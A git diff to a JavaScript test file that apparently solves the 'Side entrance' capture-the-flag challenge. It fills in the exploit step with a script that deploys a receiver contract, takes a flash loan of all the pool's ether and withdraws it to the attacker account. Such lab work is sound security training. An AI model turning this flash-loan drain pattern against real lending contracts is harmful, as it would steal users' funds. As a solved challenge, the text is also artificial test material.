@@ -18,6 +18,7 @@ describe('[Challenge] Side entrance', function () {
 
         this.attackerInitialEthBalance = await ethers.provider.getBalance(attacker.address);
 
+        
         expect(
             await ethers.provider.getBalance(this.pool.address)
         ).to.equal(ETHER_IN_POOL);
@@ -25,6 +26,18 @@ describe('[Challenge] Side entrance', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        const FlashLoanEtherReceiverFactory = await ethers.getContractFactory('FlashLoanEtherReceiver', deployer);
+        this.receiver = await FlashLoanEtherReceiverFactory.deploy(this.pool.address);
+        
+        expect(
+            await ethers.provider.getBalance(this.receiver.address)
+        ).to.equal('0');
+
+        await this.receiver.executeFlashloan(ETHER_IN_POOL);
+
+        await this.receiver.connect(attacker).withdraw();
+
     });
 
     after(async function () {
